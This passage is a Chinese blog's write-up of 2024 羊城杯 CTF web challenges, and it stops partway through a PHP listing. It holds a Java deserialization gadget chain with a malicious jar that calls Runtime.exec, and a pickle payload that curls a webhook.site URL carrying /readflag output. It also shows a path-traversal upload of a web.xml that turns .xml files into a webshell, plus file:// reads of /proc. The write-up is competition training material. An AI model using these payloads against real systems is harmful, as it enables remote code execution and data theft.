

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=dark>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/fy.jpg">
  <link rel="icon" href="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/fy.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="FYHypo">
  <meta name="keywords" content="">
  
    <meta name="description" content="2024羊城杯WPWEBez_javaadmin的账号密码在jar包中给了是 admin &#x2F; admin888  用这个账号登录后台，然后打反序列化调用User类的getter方法，将恶意jar包加载进去，这个题目出网所以可以直接加载vps上的jar包。这个jar包中放一个有getter方法的恶意类，第二次使用反序列化去调用这个恶意jar包中的恶意getter方法执行命令。 反序列化调用">
<meta property="og:type" content="article">
<meta property="og:title" content="2024羊城杯WP">
<meta property="og:url" content="https://fyhypo.github.io/blog/wp/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/index.html">
<meta property="og:site_name" content="FYHypo&#39;s blog">
<meta property="og:description" content="2024羊城杯WPWEBez_javaadmin的账号密码在jar包中给了是 admin &#x2F; admin888  用这个账号登录后台，然后打反序列化调用User类的getter方法，将恶意jar包加载进去，这个题目出网所以可以直接加载vps上的jar包。这个jar包中放一个有getter方法的恶意类，第二次使用反序列化去调用这个恶意jar包中的恶意getter方法执行命令。 反序列化调用">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://fyhypo.github.io/img/ycb.jpg">
<meta property="article:published_time" content="2024-09-01T07:42:36.747Z">
<meta property="article:modified_time" content="2024-09-01T07:50:57.821Z">
<meta property="article:author" content="FYHypo">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://fyhypo.github.io/img/ycb.jpg">
  
  
  
  <title>2024羊城杯WP - FYHypo&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/custom.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"fyhypo.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>FYHypo</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/none.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2024羊城杯WP"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-09-01 15:42" pubdate>
          2024年9月1日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.6k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          56 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">2024羊城杯WP</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="2024羊城杯WP"><a href="#2024羊城杯WP" class="headerlink" title="2024羊城杯WP"></a>2024羊城杯WP</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h3><p>admin的账号密码在jar包中给了是 admin &#x2F; admin888  用这个账号登录后台，然后打反序列化调用User类的getter方法，将恶意jar包加载进去，这个题目出网所以可以直接加载vps上的jar包。这个jar包中放一个有getter方法的恶意类，第二次使用反序列化去调用这个恶意jar包中的恶意getter方法执行命令。</p>
<p>反序列化调用getter方法，用EventListenerList类调用jackson的toString方法，再从toString到题目环境中的Getter方法。</p>
<p>另外就是使用jar协议去绕过对http和file协议的限制。</p>
<p>构建一个恶意 jar</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exec</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin888&quot;</span>;<br>    <span class="hljs-keyword">public</span> String gift;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">exec</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getGift</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">gift</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.username;<br>        java.lang.Runtime.getRuntime().exec(<span class="hljs-built_in">this</span>.username);<br>        <span class="hljs-keyword">return</span> gift;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setGift</span><span class="hljs-params">(String gift)</span> &#123;<br>        <span class="hljs-built_in">this</span>.gift = gift;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">exec</span><span class="hljs-params">(String username, String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<p>加载恶意jar包exp：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.ycbjava;<br><br><span class="hljs-keyword">import</span> com.example.ycbjava.bean.User;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;jar:http://xxxxxxxxxx/test.jar!/&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">toStringClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(user);<br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) refl.getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(toStringClass);<br>        refl.setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        <span class="hljs-type">byte</span>[] ser = refl.serialize(list);<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Encoder().encode(ser).replaceAll(<span class="hljs-string">&quot;\r|\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>加载好 jar 后再次触发反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.ycbjava;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classloader</span> <span class="hljs-operator">=</span> (URLClassLoader)ClassLoader.getSystemClassLoader();<br>        Class&lt;?&gt; execClass = classloader.loadClass(<span class="hljs-string">&quot;org.example.exec&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xxxxxxxxxx&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> execClass.newInstance();<br>        refl.setFieldValue(exec,<span class="hljs-string">&quot;username&quot;</span>,cmd);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">toStringClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(exec);<br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) refl.getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(toStringClass);<br>        refl.setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        <span class="hljs-type">byte</span>[] ser = refl.serialize(list);<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Encoder().encode(ser).replaceAll(<span class="hljs-string">&quot;\r|\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h3 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h3><p><code>/lyrics</code> 路由存在路径穿越</p>
<p><img src="https://s2.loli.net/2024/08/28/1be5zFBy72AdDgs.png" srcset="/img/loading.gif" lazyload alt="image-20240828023907180"></p>
<p>我们可以通过 <code>/proc/self/cwd/app.py</code> 拿到源代码, 同时还有这些</p>
<ul>
<li><code>/proc/self/cwd/config/secret_key.py</code></li>
<li><code>/proc/self/cwd/cookie.py</code></li>
</ul>
<p><code>secret_code = &quot;EnjoyThePlayTime123456&quot;</code></p>
<p><strong>Pickle 反序列化</strong></p>
<p>可以看到一个脆弱的 <code>blacklist</code></p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">blacklist</span> = [b<span class="hljs-string">&#x27;R&#x27;</span>, b<span class="hljs-string">&#x27;secret&#x27;</span>, b<span class="hljs-string">&#x27;eval&#x27;</span>, b<span class="hljs-string">&#x27;file&#x27;</span>, b<span class="hljs-string">&#x27;compile&#x27;</span>, b<span class="hljs-string">&#x27;open&#x27;</span>, b<span class="hljs-string">&#x27;os.popen&#x27;</span>]<br></code></pre></td></tr></table></figure>

<p>我们可以直接在网上搜一个不存在上面字符串的 pickle payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;/bin/bash -c &quot;curl https://webhook.site/46160581-8f60-4ea0-8493-8872ea571270`/readflag | base64`&quot;&#x27;\nios\nsystem\n.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>通过</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">set_cookie(<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;/bin/bash -c &quot;curl https://webhook.site/xxxxxxxxxxxxxxxxxxxxxxx/`/readflag`&quot;&#x27;\nios\nsystem\n.&#x27;&#x27;&#x27;</span>, secret= <span class="hljs-string">&quot;EnjoyThePlayTime123456&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>即可 RCE</p>
<h3 id="tomtom2"><a href="#tomtom2" class="headerlink" title="tomtom2"></a>tomtom2</h3><p>代码审计</p>
<p>账号: <code>admin</code>  密码 <code>admin888</code></p>
<p><img src="https://s2.loli.net/2024/08/28/OLywDoXBnvtb4xH.png" srcset="/img/loading.gif" lazyload alt="image-20240828033341185"></p>
<p><code>upload</code> 路由存在路径穿越</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/myapp/upload?path=../../conf/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>139.155.126.78:39990<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryNAJDsE29J61LXwA1<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=C72FF724D6478E780EBFB2947EFF24EA<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1317<br><br><span class="language-xml">------WebKitFormBoundaryNAJDsE29J61LXwA1</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;web.xml&quot;</span><br><span class="language-xml">Content-Type: text/xml</span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>JSPPage<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>development<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>reload<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>JSPPage<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>JSPPage<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/myapp/uploads/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span></span><br><span class="language-xml">------WebKitFormBoundaryNAJDsE29J61LXwA1--</span><br></code></pre></td></tr></table></figure>

<p>再上传一个一句话木马，后缀为 <code>xml</code> 即可连接</p>
<h3 id="网络照相馆"><a href="#网络照相馆" class="headerlink" title="网络照相馆"></a>网络照相馆</h3><p><code>url.php</code>任意文件 curl 读, 参考 <code>ctfshow - 元旦水友赛 2024 - easy_include</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">file://localhost/proc/self/cwd/url.php<br></code></pre></td></tr></table></figure>

<p>可以读取文件</p>
<p><strong>url.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//error_reporting(0);</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;function.php&#x27;</span>;<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;sql.php&#x27;</span>;<br><br><span class="hljs-variable">$baseDir</span> = <span class="hljs-string">&quot;data/&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$parse</span> = <span class="hljs-title function_ 